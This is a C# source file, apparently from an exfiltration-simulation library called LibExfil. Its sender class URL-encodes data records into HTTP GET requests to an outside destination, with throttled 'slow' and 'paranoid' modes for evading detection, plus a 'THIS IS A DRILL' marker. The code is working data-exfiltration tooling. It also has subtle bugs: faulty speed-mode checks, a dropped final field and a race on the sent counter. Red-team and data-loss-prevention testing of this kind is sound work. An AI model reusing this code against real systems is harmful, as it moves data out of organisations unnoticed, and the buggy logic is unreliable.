using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using LibExfil.Structures;
using System.Net.Http;
using System.Web;
using System.Linq.Expressions;
using System.Net.Sockets;
using System.Net;
using System.Threading;

namespace LibExfil.DataSenders
{
    public class HttpGetSender : IBaseSenderInterface
    {
        Options ops;
        public HttpGetSender(Options opts = Options.NONE)
        { ops = opts; }

        /// <summary>
        /// This will read the information from within records and then urlencode & send to destination_url
        /// the defaultPath is optional.  It will only be taken into consideration if the destionation_url ends in a '/' character.
        /// this is used to ensure a well formed url, as a uri query should not (but technically can) be sent to a directory.. ie a url ending in '/'
        /// so basically, if the url ends in a '/' then the value of defaultPath will be appended to it.  this should be a file name of some sort.
        /// if defaultPath ends in a '/' character, then this will force appending the uri query to the end of a directory uri
        /// As always, "THIS IS A DRILL, THIS IS A DRILL, THIS IS A DRILL" will be appended to the end of the query
        /// </summary>
        /// <param name="records">the DataRecordCollection object containing the records to be send</param>
        /// <param name="destionation_url">the desintation url to send the data too</param>
        /// <param name="defaultPath">the uri path to query.  only used if the default_url ends in a '/' character</param>
        public int Send(DataRecordCollection data, string destination)
        {
            //String URL = host + /+ URLENCODE THE LINE HERE
            //looks like
            // http://127.0.0.1/receivedata.php?name=somename&id=27&data=april_28_2020")
            //format of: [host]:[port]/uri/?[schema1]=[value1]....
            // Console.WriteLine(responseString);
            if ((ops & Options.SPEED_MODERATE) != 0)
                return ModerateSend(data, destination);

            else if ((ops | Options.SPEED_FAST) != 0)
                return FastSend(data, destination);

            else if ((ops | Options.SPEED_SLOW) != 0)
                return SlowSend(data, destination);

            else if ((ops | Options.SPEED_PARANOID) != 0)
                return ParanoidSend(data, destination);

            else
                return ModerateSend(data, destination);

        }

        private int ParanoidSend(DataRecordCollection data, string destination)
        {
            int sent = 0;
            HttpClient httpclient = new HttpClient();
            String exfilDestination = destination;
            String finalURL = exfilDestination;
            List<Task> tasks = new List<Task>();
            string[] keys = data.GetSchema();
            foreach (object dd in data)  //iterate through each record in the records list
            {
                if (dd == null)
                    continue;

                DataRecord dr = (DataRecord)dd;
                sent += DoWork(dr, keys, destination);
                Console.WriteLine("Paranoid.  Sleeping 60 seconds");
                Thread.Sleep(60000);
            }
            return sent;
        }
        private int SlowSend(DataRecordCollection data, string destination)
        {
            int sent = 0;
            HttpClient httpclient = new HttpClient();
            String exfilDestination = destination;
            String finalURL = exfilDestination;
            List<Task> tasks = new List<Task>();
            string[] keys = data.GetSchema();
            foreach (object dd in data)  //iterate through each record in the records list
            {
                if (dd == null)
                    continue;

                DataRecord dr = (DataRecord)dd;
                sent += DoWork(dr, keys, destination);
                Console.WriteLine("Sent. Sleeping 5 seconds");
                Thread.Sleep(5000);
            }
            return sent;
        }
        private int ModerateSend(DataRecordCollection data, string destination)
        {
            int sent = 0;
            HttpClient httpclient = new HttpClient();
            String exfilDestination = destination;
            String finalURL = exfilDestination;
            List<Task> tasks = new List<Task>();
            string[] keys = data.GetSchema();
            foreach (object dd in data)  //iterate through each record in the records list
            {
                if (dd == null)
                    continue;

                DataRecord dr = (DataRecord)dd;
                sent += DoWork(dr, keys, destination);
            }
            return sent;
        }
        private int FastSend(DataRecordCollection data, string destination)
        {
            int sent = 0;
            List<Task> tasks = new List<Task>();
            HttpClient httpclient = new HttpClient();
            string[] keys = data.Schema;
            foreach (object dd in data)  //iterate through each record in the records list
            {
                if (dd == null)
                    continue;
                Task t = Task.Run(() =>
                {
                    DataRecord dr = (DataRecord)dd;
                    sent+=DoWork(dr, keys, destination);
                });
                tasks.Add(t);
            }
            foreach (Task t in tasks) t.Wait(); //wait to finsih all requests before we move on.
            return sent;
        }
        private int DoWork(DataRecord dr, string[] keys, string destination)
        {

            string[] vals = dr.Data;

            if (keys.Length > 0)
            {
                String uriPathQuery = "?";
                uriPathQuery += "Info=THIS IS A DRILL, THIS IS A DRILL, THIS IS A DRILL";
                for (int i = 0; i < keys.Count() - 1; i++)
                {
                    String key = keys[i];
                    String val = vals[i];
                    uriPathQuery += key + "=" + val + "&";

                }
                uriPathQuery += "Info=THIS IS A DRILL, THIS IS A DRILL, THIS IS A DRILL";
                String finalURL = destination + HttpUtility.UrlEncode(uriPathQuery);
                using (var httpClient = new HttpClient())
                {
                    try
                    {
                        //Console.WriteLine("[+] - GET URI: "+ finalURL+System.Environment.NewLine);
                        var result = httpClient.GetAsync(finalURL);
                        result.Wait();

                    }
                    catch (SocketException e1) { Console.WriteLine("Socket Exception+ host: " + destination + " is refusing our connections"); }
                    catch (WebException e2) { Console.WriteLine("Web Exception+ host: " + destination + " message: " + e2.Message); }
                    catch (HttpRequestException e3) { Console.WriteLine("Web Exception+ host: " + destination + "message: " + e3.Message); }
                }
            }
            return 1;
        }
    }
}






/*
 *         //String URL = host + /+ URLENCODE THE LINE HERE
            //looks like
            // http://127.0.0.1/receivedata.php?name=somename&id=27&data=april_28_2020")
            //format of: [host]:[port]/uri/?[schema1]=[value1]....
            // Console.WriteLine(responseString);
            int sent = 0;
            List<Task> tasks = new List<Task>();
            HttpClient httpclient = new HttpClient();
            string[] keys = data.Schema;
            foreach (object dd in data)  //iterate through each record in the records list
            {
                if (dd == null)
                    continue;
                Task t = Task.Run(() =>
                {
                    DataRecord dr = (DataRecord)dd;
                    string[] vals = dr.Data;

                    if (keys.Length > 0)
                    {
                        String uriPathQuery = "?";
                        uriPathQuery += "Info=THIS IS A DRILL, THIS IS A DRILL, THIS IS A DRILL";
                        for (int i = 0; i < keys.Count() - 1; i++)
                        {
                            String key = keys[i];
                            String val = vals[i];
                            uriPathQuery += key + "=" + val + "&";

                        }
                        uriPathQuery += "Info=THIS IS A DRILL, THIS IS A DRILL, THIS IS A DRILL";
                        String finalURL = destination + HttpUtility.UrlEncode(uriPathQuery);
                        using (var httpClient = new HttpClient())
                        {
                            try
                            {
                                //Console.WriteLine("[+] - GET URI: "+ finalURL+System.Environment.NewLine);
                                var result = httpclient.GetAsync(finalURL);
                                result.Wait();
                                sent++;
                            }
                            catch(SocketException e1){ Console.WriteLine("Socket Exception+ host: "+destination+ " is refusing our connections"); }
                            catch(WebException e2) { Console.WriteLine("Web Exception+ host: "+ destination+" message: "+e2.Message); }
                            catch (HttpRequestException e3){ Console.WriteLine("Web Exception+ host: "+destination+ "message: "+e3.Message); }
                        }
                    }
                });
                    tasks.Add(t);
                }
            foreach (Task t in tasks) t.Wait(); //wait to finsih all requests before we move on.
            return sent;
        }
 * 
 * */

